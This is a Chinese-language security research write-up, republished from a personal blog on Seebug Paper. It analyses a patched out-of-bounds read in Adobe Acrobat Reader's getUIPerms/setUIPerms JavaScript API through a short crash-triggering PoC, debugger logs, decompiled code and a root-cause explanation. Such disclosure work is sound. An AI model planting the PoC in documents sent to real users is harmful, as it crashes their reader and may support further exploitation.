**作者：o0xmuhe**

**来源：[Adobe Acrobat Reader getUIPerms/setUIPerms Unicode String Out-of-bound
Read](https://o0xmuhe.github.io/2019/08/14/Adobe-Acrobat-Reader-getUIPerms-setUIPerms-Unicode-String-Out-of-bound-Read/# "Adobe Acrobat Reader
getUIPerms/setUIPerms Unicode String Out-of-bound Read") **

Unicode String Out-of-bound Read

8月补丁被xlab撞了，索性就放出来了。

## 0x00 : PoC

`doc`对象的`getUIPerms`函数的越界读

    
    
    app.doc.getUIPerms({cFeatureName:"\xFE\xFFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"})

其实setUIPerms也能触发，但是参数和这个getUIPerms不太一样，但是核心问题都是一样的。

## 0x01 : Crash log

    
    
    0:000> g
    (2a70.388): Access violation - code c0000005 (!!! second chance !!!)
    eax=32d7cf00 ebx=0098cbd0 ecx=00000000 edx=32d7d000 esi=00000068 edi=7fffffff
    eip=59ca7675 esp=0098ca98 ebp=0098caa4 iopl=0         nv up ei ng nz ac pe cy
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010297
    EScript!mozilla::HashBytes+0x47e7f:
    59ca7675 8a02            mov     al,byte ptr [edx]          ds:002b:32d7d000=??
    0:000> k10
     # ChildEBP RetAddr  
    WARNING: Stack unwind information not available. Following frames may be wrong.
    00 0098caa4 59c52b96 EScript!mozilla::HashBytes+0x47e7f
    01 0098cab8 59c545c4 EScript!PlugInMain+0x1119
    02 0098cad8 59c54331 EScript!PlugInMain+0x2b47
    03 0098cb0c 59ca76d5 EScript!PlugInMain+0x28b4
    04 0098cb24 59ca29f4 EScript!mozilla::HashBytes+0x47edf
    05 0098cb9c 59c93bb3 EScript!mozilla::HashBytes+0x431fe
    06 0098cbec 59c93912 EScript!mozilla::HashBytes+0x343bd
    07 0098cc64 59ca1f86 EScript!mozilla::HashBytes+0x3411c
    08 0098cce0 59c86d06 EScript!mozilla::HashBytes+0x42790
    09 0098cd54 59c8175d EScript!mozilla::HashBytes+0x27510
    0a 0098d210 59c80606 EScript!mozilla::HashBytes+0x21f67
    0b 0098d250 59c80517 EScript!mozilla::HashBytes+0x20e10
    0c 0098d28c 59c80460 EScript!mozilla::HashBytes+0x20d21
    0d 0098d2bc 59c68ec3 EScript!mozilla::HashBytes+0x20c6a
    0e 0098d304 59ca87ac EScript!mozilla::HashBytes+0x96cd
    0f 0098d380 59ca84ec EScript!mozilla::HashBytes+0x48fb6
    0:000> dd edx-10
    32d7cff0  41414141 41414141 41414141 d0004141
    32d7d000  ???????? ???????? ???????? ????????
    32d7d010  ???????? ???????? ???????? ????????
    32d7d020  ???????? ???????? ???????? ????????
    32d7d030  ???????? ???????? ???????? ????????
    32d7d040  ???????? ???????? ???????? ????????
    32d7d050  ???????? ???????? ???????? ????????
    32d7d060  ???????? ???????? ???????? ????????
    
    0:000> dd edx-0x80
    32d7cf80  00000067 00001000 00000000 00000000
    32d7cf90  0475f34c dcbabbbb 4141fffe 41414141
    32d7cfa0  41414141 41414141 41414141 41414141
    32d7cfb0  41414141 41414141 41414141 41414141
    32d7cfc0  41414141 41414141 41414141 41414141
    32d7cfd0  41414141 41414141 41414141 41414141
    32d7cfe0  41414141 41414141 41414141 41414141
    32d7cff0  41414141 41414141 41414141 d0004141

参数是 `\xFE\xFF\x41414141.....`

`edx`指向参数

## 0x02 : Analysis

读`unicode`字符串函数，是没有问题的，应该是上层逻辑的问题，没有做充分的判断，导致用读`unicode string`的逻辑去读取了`ascii
string` 。

这就导致，读取了更多的数据，然后就`oob`了。

    
    
    unsigned int __cdecl sub_23802B75(char *a1, unsigned int a2, void (__cdecl *a3)(const wchar_t *, const wchar_t *, const wchar_t *, unsigned int, uintptr_t))
    {
      unsigned int result; // eax
    
      if ( a1 && *a1 == 0xFEu && a1[1] == 0xFFu )
        result = sub_2385763B(a1, a2, a3);          // unicode
      else
        result = sub_23802BA9(a1, a2, a3);          // ascii string
      return result;
    }

调试，漏洞发生时参数信息如下：

![img](https://images.seebug.org/content/images/2019/08/14/1565771705000-1xuvae.png-w331s)

可以看到，传入的参数并不是`unicode string`，但是却按照`unicode string`的代码逻辑去读，所以就越界了。

上一层逻辑中，我们看到，对于读取字符串的逻辑来说，只简单的检查了：

  1. 字符串是否有效
  2. 字符串开头是否是\xFE\xFF
  3. 满足2，就走unicode逻辑
  4. 不满足就走ascii逻辑

但是这里应该不是`root cause`，而且这部分底层逻辑也没啥问题，应该是上层的逻辑出了问题，导致下层代码执行时候崩溃。

问题出在 `app.doc.getUIPerms()` 函数实现，在参数传递的时候，参数处理考虑不周导致。

需要找这个对象注册方法的地方，找了一圈，发现这个方法的实现在`DigSig.api`中。

    
    
    0:000> da poi(esp+8)
    553dfbbc  "getUIPerms"
    0:000> ln poi(esp+c)
    (55311705)   DigSig!PlugInMain+0x48f3a   |  (55311705)   DigSig!PlugInMain

函数实现如下:

    
    
    int __usercall sub_23056B10@<eax>(_DWORD *a1@<ebp>)
    {
      int v1; // edi
      bool v2; // zf
      int v3; // eax
      int v4; // eax
      int v5; // ST08_4
      int v6; // ST04_4
      int v7; // eax
      signed int v8; // edi
      int v9; // eax
      int v10; // esi
      char v11; // al
      signed int v12; // ecx
      signed int v14; // [esp-8h] [ebp-8h]
    
      sub_23002069(80);
      v1 = a1[2];
      v2 = (*(int (__thiscall **)(_DWORD, _DWORD))(dword_23124F64 + 204))(*(_DWORD *)(dword_23124F64 + 204), a1[2]) == 0;
      v3 = dword_23124F64;
      if ( !v2 )
      {
        v14 = 13;
    LABEL_3:
        (*(void (__cdecl **)(int, _DWORD, _DWORD, signed int, _DWORD))(v3 + 352))(v1, a1[3], a1[4], v14, 0);
        return sub_230022F2();
      }
      v4 = (*(int (__cdecl **)(int))(dword_23124F64 + 828))(v1);
      *(a1 - 6) = v4;
      if ( !v4 )
      {
        v3 = dword_23124F64;
        v14 = 14;
        goto LABEL_3;
      }
      sub_230D8FCE(v1);
      *(a1 - 23) = "cFeatureName";
      *(a1 - 21) = 0;
      *(a1 - 5) = 0;
      *(a1 - 20) = a1 - 4;
      *(a1 - 4) = 0;
      *((_WORD *)a1 - 32) = 0;
      *(a1 - 19) = 0;
      *(a1 - 18) = 0;
      v5 = a1[4];
      *(a1 - 15) = 0;
      v6 = *(a1 - 13);
      *(a1 - 14) = 0;
      v7 = dword_23124F64;
      *(a1 - 1) = 0;
      *(a1 - 22) = 6;
      *(a1 - 17) = 5;
      *((_WORD *)a1 - 31) = 1;
      if ( (*(unsigned __int16 (__thiscall **)(_DWORD, _DWORD *, int, int, _DWORD *, _DWORD *))(v7 + 368))(
             *(_DWORD *)(v7 + 368),
             a1 - 23,
             v6,
             v5,
             a1 - 5,
             a1 - 8) )
      {
        v8 = -1;
        sub_2301A104(*(a1 - 4), 0);
        *((_BYTE *)a1 - 4) = 1;
        v9 = sub_230C2D45(0, 5, 2);
        *((_BYTE *)a1 - 4) = 0;
        v10 = v9;
        sub_23007479(a1 - 10);
        if ( v10 )
        {
          v11 = sub_230BEA21(*(a1 - 6), v10);
          if ( v11 == -1 )
          {
            v8 = 0;
          }
          else
          {
            v12 = 1;
            if ( v11 )
              v12 = -1;
            v8 = v12;
          }
          (*(void (__cdecl **)(int))(dword_23124EF4 + 12))(v10);
        }
        (*(void (__cdecl **)(_DWORD, signed int))(dword_23124F64 + 108))(a1[5], v8);
      }
      else
      {
        (*(void (__cdecl **)(int, _DWORD, _DWORD, _DWORD, _DWORD))(dword_23124F64 + 352))(
          v1,
          a1[3],
          a1[4],
          *(a1 - 8),
          *(a1 - 7));
      }
      sub_2300DAE9(a1 - 13);
      return sub_230022F2();
    }

但是调试发现，根本没有触发到这里的代码逻辑。

追踪堆内存

    
    
        address 46df9f98 found in
        _DPH_HEAP_ROOT @ 5c91000
        in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                                    471b1820:         46df9f98               67 -         46df9000             2000
        5a52abb0 verifier!VerifierDisableFaultInjectionExclusionRange+0x000034c0
        7707246b ntdll!RtlDebugAllocateHeap+0x00000039
        76fd6dd9 ntdll!RtlpAllocateHeap+0x000000f9
        76fd5ec9 ntdll!RtlpAllocateHeapInternal+0x00000179
        76fd5d3e ntdll!RtlAllocateHeap+0x0000003e
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\System32\ucrtbase.dll - 
        74840106 ucrtbase!malloc_base+0x00000026
        5782a2bc AcroRd32!AXWasInitViaPDFL+0x000008cf
        5782e829 AcroRd32!CTJPEGLibInit+0x00002039
        542245d8 EScript!PlugInMain+0x00002b5b //this will call alloc func
        54224331 EScript!PlugInMain+0x000028b4
        542776d5 EScript!mozilla::HashBytes+0x00047edf
        542729f4 EScript!mozilla::HashBytes+0x000431fe
        54263bb3 EScript!mozilla::HashBytes+0x000343bd
        54263912 EScript!mozilla::HashBytes+0x0003411c
        54271f86 EScript!mozilla::HashBytes+0x00042790
        54256d06 EScript!mozilla::HashBytes+0x00027510
        5425175d EScript!mozilla::HashBytes+0x00021f67
        54250606 EScript!mozilla::HashBytes+0x00020e10
        54250517 EScript!mozilla::HashBytes+0x00020d21
        54250460 EScript!mozilla::HashBytes+0x00020c6a
        54238ec3 EScript!mozilla::HashBytes+0x000096cd
        542787ac EScript!mozilla::HashBytes+0x00048fb6
        542784ec EScript!mozilla::HashBytes+0x00048cf6
        542780e5 EScript!mozilla::HashBytes+0x000488ef
        542770b4 EScript!mozilla::HashBytes+0x000478be
        542e85e9 EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x00061731
        5803da6f AcroRd32!AIDE::PixelPartInfo::operator=+0x0010536f
        57f6723a AcroRd32!AIDE::PixelPartInfo::operator=+0x0002eb3a
        57f6345e AcroRd32!AIDE::PixelPartInfo::operator=+0x0002ad5e
        57d3002d AcroRd32!AX_PDXlateToHostEx+0x001ff9b5
        57d3057c AcroRd32!AX_PDXlateToHostEx+0x001fff04
        57f66e8e AcroRd32!AIDE::PixelPartInfo::operator=+0x0002e78e

callstack 和 堆追踪 得到的结果 前部分重合，内存在

![-w699](https://images.seebug.org/content/images/2019/08/14/1565771706000-2mocgo.png-w331s)

这个call里分配，这个call一直到核心dll再到ntdll去分配内存。

分析的参数来源发现：

    
    
    else if ( a3 == 2 )
      {
        v17 = (*(int (__cdecl **)(_DWORD, void *))(dword_23A65354 + 0x60))(*v4, Src);// 
                                                  // 
                                                  // 0:000> dd 4bc86fe8 
                                                  // 4bc86fe8  000000cc 4f6d0f30 00000000 00000000
                                                  // 4bc86ff8  00000000 00000000 ???????? ????????
                                                  // 4bc87008  ???????? ???????? ???????? ????????
                                                  // 4bc87018  ???????? ???????? ???????? ????????
                                                  // 4bc87028  ???????? ???????? ???????? ????????
                                                  // 4bc87038  ???????? ???????? ???????? ????????
                                                  // 4bc87048  ???????? ???????? ???????? ????????
                                                  // 4bc87058  ???????? ???????? ???????? ????????
                                                  // 
                                                  // length str
                                                  // 
                                                  // unicode str--> ascii str
      }

这个调用对数据作处理，输入数据：

    
    
    0:000> dd 4f6d0f30 
    4f6d0f30  00ff00fe 00410041 00410041 00410041
    4f6d0f40  00410041 00410041 00410041 00410041
    4f6d0f50  00410041 00410041 00410041 00410041
    4f6d0f60  00410041 00410041 00410041 00410041
    4f6d0f70  00410041 00410041 00410041 00410041
    4f6d0f80  00410041 00410041 00410041 00410041
    4f6d0f90  00410041 00410041 00410041 00410041
    4f6d0fa0  00410041 00410041 00410041 00410041
    0:000> dd 4f6d0f30  + 0xcc
    4f6d0ffc  d0d00000 ???????? ???????? ????????
    4f6d100c  ???????? ???????? ???????? ????????
    4f6d101c  ???????? ???????? ???????? ????????
    4f6d102c  ???????? ???????? ???????? ????????
    4f6d103c  ???????? ???????? ???????? ????????
    4f6d104c  ???????? ???????? ???????? ????????
    4f6d105c  ???????? ???????? ???????? ????????
    4f6d106c  ???????? ???????? ???????? ????????

得到的结果是:

    
    
    0:000> r eax
    eax=4b9cef98
    0:000> dd eax
    4b9cef98  4141fffe 41414141 41414141 41414141
    4b9cefa8  41414141 41414141 41414141 41414141
    4b9cefb8  41414141 41414141 41414141 41414141
    4b9cefc8  41414141 41414141 41414141 41414141
    4b9cefd8  41414141 41414141 41414141 41414141
    4b9cefe8  41414141 41414141 41414141 41414141
    4b9ceff8  41414141 d0004141 ???????? ????????
    4b9cf008  ???????? ???????? ???????? ????????

然后直接把这个`buffer`为参数传递给处理函数（此时这是一个ascii string)

    
    
    0:000> p
    Breakpoint 2 hit
    eax=4b9cef98 ebx=0098cec4 ecx=00000000 edx=7fffff99 esi=4b9cef98 edi=0098ce4c
    eip=529145bf esp=0098ce10 ebp=0098ce28 iopl=0         nv up ei pl nz na po nc
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
    EScript!PlugInMain+0x2b42:
    529145bf e8b1e5ffff      call    EScript!PlugInMain+0x10f8 (52912b75)
    0:000> dd esi
    4b9cef98  4141fffe 41414141 41414141 41414141
    4b9cefa8  41414141 41414141 41414141 41414141
    4b9cefb8  41414141 41414141 41414141 41414141
    4b9cefc8  41414141 41414141 41414141 41414141
    4b9cefd8  41414141 41414141 41414141 41414141
    4b9cefe8  41414141 41414141 41414141 41414141
    4b9ceff8  41414141 d0004141 ???????? ????????
    4b9cf008  ???????? ???????? ???????? ????????

处理函数判断是不是`unicode`，只是判断前两个字符是不是`\xFE\xFF`，就走了`unicode`逻辑，所以导致越界读。

## 0x03 : what is root cause

其实就是上层一点的逻辑对输入的参数没做转换(to
unicode)，导致后面获取长度的函数处理字符串的时候，误认为`\xFE\xFF`开头的就是unicode字符串，然后就越界读取了。

## 0x04 : Conclusion

几个月前写的分析了，可能会有错误，有问题欢迎和我沟通 : -)

这个攻击面可能就这么一点一点的消失了吧 :-)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1016/>

